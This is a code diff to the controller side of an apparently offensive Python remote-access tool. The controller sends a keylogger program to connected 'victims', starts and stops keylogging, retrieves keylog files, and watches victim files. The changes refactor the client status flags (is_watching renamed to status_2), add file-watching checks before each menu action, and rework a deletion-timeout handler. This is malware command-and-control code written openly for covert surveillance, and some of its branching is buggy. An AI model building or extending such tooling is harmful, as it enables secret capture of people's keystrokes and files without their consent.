@@ -9,6 +9,7 @@ import constants
 import ipaddress
 from typing import TextIO
 
+
 def display_menu():
     print(constants.MENU_CLOSING_BANNER)
     print(constants.MENU_ITEM_ONE)
@@ -298,13 +299,11 @@ def __is_keylogging(status: bool, client_ip: str, client_port: int, error_msg: s
 def is_watching(status: bool, client_ip: str, client_port: int, error_msg: str):
     if status:
         print(error_msg.format(client_ip, client_port))
-        print(constants.WATCH_FILE_STATUS_TRUE_ERROR_SUGGEST)
+        print(constants.WATCH_STATUS_TRUE_ERROR_SUGGEST)
         print(constants.RETURN_MAIN_MENU_MSG)
         print(constants.MENU_CLOSING_BANNER)
         return True
     else:
-        print(constants.RETURN_MAIN_MENU_MSG)
-        print(constants.MENU_CLOSING_BANNER)
         return False
 
 
@@ -393,11 +392,11 @@ def find_specific_client_socket(client_dict: dict,
 
 
 def perform_menu_item_3(client_dict: dict):
-    # Check if client list is empty
+    # CASE 1: Check if client list is empty
     if len(client_dict) == constants.ZERO:
         print(constants.FILE_TRANSFER_NO_CONNECTED_CLIENTS_ERROR)
 
-    # Handle single client in client list
+    # CASE 2: Handle single client in client list
     if len(client_dict) == constants.CLIENT_LIST_INITIAL_SIZE:
         client_socket, (client_ip, client_port, status, status_2) = next(iter(client_dict.items()))
 
@@ -405,17 +404,26 @@ def perform_menu_item_3(client_dict: dict):
         if __is_keylogging(status, client_ip, client_port, constants.FILE_TRANSFER_KEYLOG_TRUE_ERROR):
             return None
 
+        # Check if file/directory watching
+        if is_watching(status_2, client_ip, client_port, constants.WATCH_STATUS_TRUE_ERROR):
+            return None
+
         transfer_keylog_program(client_socket, client_ip, client_port)
 
-    # Send keylogger to any specific connected victim
+    # CASE 3: Send keylogger to any specific connected victim
     elif len(client_dict) != constants.ZERO:
         target_ip = input(constants.ENTER_TARGET_IP_FIND_PROMPT)
         target_port = int(input(constants.ENTER_TARGET_PORT_FIND_PROMPT))
-        target_socket, target_ip, target_port, status, is_watching = find_specific_client_socket(client_dict,
-                                                                                                 target_ip, target_port)
+        target_socket, target_ip, target_port, status, status_2 = find_specific_client_socket(client_dict,
+                                                                                              target_ip,
+                                                                                              target_port)
 
         # Check if target socket is currently running keylogger
         if __is_keylogging(status, target_ip, target_port, constants.FILE_TRANSFER_KEYLOG_TRUE_ERROR):
+            return None
+
+        # Check if file/directory watching
+        if is_watching(status_2, target_ip, target_port, constants.WATCH_STATUS_TRUE_ERROR):
             return None
 
         if target_socket:
@@ -439,25 +447,29 @@ def perform_menu_item_1(client_dict: dict):
     # b) CASE: Handle single client in client list
     if len(client_dict) == constants.CLIENT_LIST_INITIAL_SIZE:
         # Get client socket
-        client_socket, (ip, port, status, is_watching) = next(iter(client_dict.items()))
+        client_socket, (ip, port, status, status_2) = next(iter(client_dict.items()))
 
         if __is_keylogging(status, ip, port, constants.KEYLOG_STATUS_TRUE_ERROR):
             pass
+        if is_watching(status_2, ip, port, constants.WATCH_STATUS_TRUE_ERROR):
+            pass
         else:
-            __perform_menu_item_1_helper(client_socket, client_dict, ip, port, is_watching)
+            __perform_menu_item_1_helper(client_socket, client_dict, ip, port, status_2)
 
     # c) CASE: Handle any specific connected client in client list
     elif len(client_dict) != constants.ZERO:
         target_ip = input(constants.ENTER_TARGET_IP_START_KEYLOG)
         target_port = int(input(constants.ENTER_TARGET_PORT_START_KEYLOG))
-        target_socket, target_ip, target_port, status, is_watching = find_specific_client_socket(client_dict,
-                                                                                                 target_ip,
-                                                                                                 target_port)
+        target_socket, target_ip, target_port, status, status_2 = find_specific_client_socket(client_dict,
+                                                                                              target_ip,
+                                                                                              target_port)
         if target_socket:
             if __is_keylogging(status, target_ip, target_port, constants.KEYLOG_STATUS_TRUE_ERROR):
                 pass
+            if is_watching(status_2, target_ip, target_port, constants.WATCH_STATUS_TRUE_ERROR):
+                pass
             else:
-                __perform_menu_item_1_helper(target_socket, client_dict, target_ip, target_port, is_watching)
+                __perform_menu_item_1_helper(target_socket, client_dict, target_ip, target_port, status_2)
         else:
             print(constants.TARGET_VICTIM_NOT_FOUND)
             print(constants.RETURN_MAIN_MENU_MSG)
@@ -527,20 +539,20 @@ def perform_menu_item_2(client_dict: dict):
     # b) CASE: Handle single client in client list
     if len(client_dict) == constants.CLIENT_LIST_INITIAL_SIZE:
         # Get client socket
-        client_socket, (ip, port, status, is_watching) = next(iter(client_dict.items()))
-        __perform_menu_item_2_helper(client_dict, client_socket, ip, port, status, is_watching)
+        client_socket, (ip, port, status, status_2) = next(iter(client_dict.items()))
+        __perform_menu_item_2_helper(client_dict, client_socket, ip, port, status, status_2)
 
     # c) CASE: Handle for clients greater than 1
     elif len(client_dict) != constants.ZERO:
         target_ip = input(constants.ENTER_TARGET_IP_STOP_KEYLOG)
         target_port = int(input(constants.ENTER_TARGET_PORT_STOP_KEYLOG))
-        target_socket, target_ip, target_port, status, is_watching = find_specific_client_socket(client_dict,
-                                                                                                 target_ip,
-                                                                                                 target_port)
+        target_socket, target_ip, target_port, status, status_2 = find_specific_client_socket(client_dict,
+                                                                                              target_ip,
+                                                                                              target_port)
 
         if target_socket:
             __perform_menu_item_2_helper(client_dict, target_socket,
-                                         target_ip, target_port, status, is_watching)
+                                         target_ip, target_port, status, status_2)
         else:
             print(constants.TARGET_VICTIM_NOT_FOUND)
             print(constants.RETURN_MAIN_MENU_MSG)
@@ -549,7 +561,11 @@ def perform_menu_item_2(client_dict: dict):
 
 def __perform_menu_item_2_helper(client_dict: dict, client_socket: socket.socket,
                                  target_ip: str, target_port: int, status: bool,
-                                 is_watching: bool):
+                                 status_2: bool):
+    # Check watching status
+    if is_watching(status_2, target_ip, target_port, constants.WATCH_STATUS_TRUE_ERROR):
+        pass
+
     # Check keylog status
     if not __is_keylogging(status, target_ip, target_port, constants.STOP_KEYLOG_STATUS_FALSE):
         pass
@@ -578,7 +594,7 @@ def __perform_menu_item_2_helper(client_dict: dict, client_socket: socket.socket
             print(constants.KEYLOG_OPERATION_SUCCESSFUL)
 
             # Update client status
-            client_dict[client_socket] = (target_ip, target_port, False, is_watching)
+            client_dict[client_socket] = (target_ip, target_port, False, status_2)
             print(constants.RETURN_MAIN_MENU_MSG)
             print(constants.MENU_CLOSING_BANNER)
         else:
@@ -639,10 +655,12 @@ def perform_menu_item_4(client_dict: dict):
 
     # CASE 2: Handle single client in client list
     if len(client_dict) == constants.CLIENT_LIST_INITIAL_SIZE:
-        client_socket, (client_ip, client_port, status, is_watching) = next(iter(client_dict.items()))
+        client_socket, (client_ip, client_port, status, status_2) = next(iter(client_dict.items()))
 
-        # Check if currently keylogging
+        # Check status
         if __is_keylogging(status, client_ip, client_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
+            pass
+        elif is_watching(status_2, client_ip, client_port, constants.WATCH_STATUS_TRUE_ERROR):
             pass
         else:
             __perform_menu_item_4_helper(client_socket, client_ip, client_port)
@@ -651,9 +669,9 @@ def perform_menu_item_4(client_dict: dict):
     elif len(client_dict) != constants.ZERO:
         target_ip = input(constants.ENTER_TARGET_IP_GET_FILES)
         target_port = int(input(constants.ENTER_TARGET_PORT_GET_FILES))
-        target_socket, target_ip, target_port, status = find_specific_client_socket(client_dict,
-                                                                                    target_ip,
-                                                                                    target_port)
+        target_socket, target_ip, target_port, status, status_2 = find_specific_client_socket(client_dict,
+                                                                                              target_ip,
+                                                                                              target_port)
 
         if __is_keylogging(status, target_ip, target_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
             pass
@@ -713,6 +731,31 @@ def create_file_name(file_path: str):
     return file_name
 
 
+def __process_deletion_timeout(client_ip,
+                               client_list,
+                               client_port,
+                               client_socket,
+                               file_path,
+                               is_keylog,
+                               signal_queue: queue.Queue):
+    # Print Termination Statements
+    print(constants.WATCH_FILE_DELETE_DETECTED_MSG.format(file_path, client_ip, client_port))
+    print(constants.WATCH_FILE_THREAD_TERMINATING)
+
+    # Reset is_watching_file flag to default (False)
+    client_list[client_socket] = (client_ip, client_port, is_keylog, False)
+
+    # Reset SetTimeOut Timer (to prevent disconnection)
+    client_socket.settimeout(None)
+
+    # Send signal to signal_queue to notify main() that global_thread has stopped
+    signal_queue.put(constants.STOP_KEYWORD)
+
+    # Send a signal back to client/victim to stop their watch_file_stop_signal() thread
+    client_socket.send(constants.STOP_KEYWORD.encode())
+    print(constants.THREAD_STOPPED_MSG)
+
+
 def watch_file_client_socket(client_socket: socket.socket,
                              signal_queue: queue.Queue,
                              file_path: str,
@@ -728,7 +771,7 @@ def watch_file_client_socket(client_socket: socket.socket,
                 client_socket.send(constants.STOP_KEYWORD.encode())
                 break
 
-            # Get Event from Client [STUCK HERE??????]
+            # Get Event from Client
             event = client_socket.recv(20).decode()
 
             # MODIFY: Get File If Modified
@@ -792,26 +835,18 @@ def watch_file_client_socket(client_socket: socket.socket,
                 client_socket.settimeout(5)
 
         except socket.timeout:
-            __process_deletion_timeout(client_ip, client_list, client_port, client_socket, file_path, is_keylog)
+            __process_deletion_timeout(client_ip, client_list, client_port,
+                                       client_socket, file_path, is_keylog,
+                                       signal_queue)
             return None
 
         except TimeoutError:
-            __process_deletion_timeout(client_ip, client_list, client_port, client_socket, file_path, is_keylog)
+            __process_deletion_timeout(client_ip, client_list, client_port,
+                                       client_socket, file_path, is_keylog,
+                                       signal_queue)
             return None
 
     # Set WATCH_FILE status to false (Before ending thread)
     client_list[client_socket] = (client_ip, client_port, is_keylog, False)
     print(constants.WATCH_FILE_THREAD_STOP)
     print(constants.WATCH_FILE_THREAD_STOP_SUCCESS)
-
-
-def __process_deletion_timeout(client_ip, client_list, client_port, client_socket, file_path, is_keylog):
-    print(constants.WATCH_FILE_DELETE_DETECTED_MSG.format(file_path, client_ip, client_port))
-    print(constants.WATCH_FILE_THREAD_TERMINATING)
-    # Reset is_watching_file flag to default (False)
-    client_list[client_socket] = (client_ip, client_port, is_keylog, False)
-    # Reset SetTimeOut Timer (to prevent disconnection)
-    client_socket.settimeout(None)
-    # Send a signal back to client/victim to stop their watch_file_stop_signal() thread
-    client_socket.send(constants.STOP_KEYWORD.encode())
-    print(constants.THREAD_STOPPED_MSG)
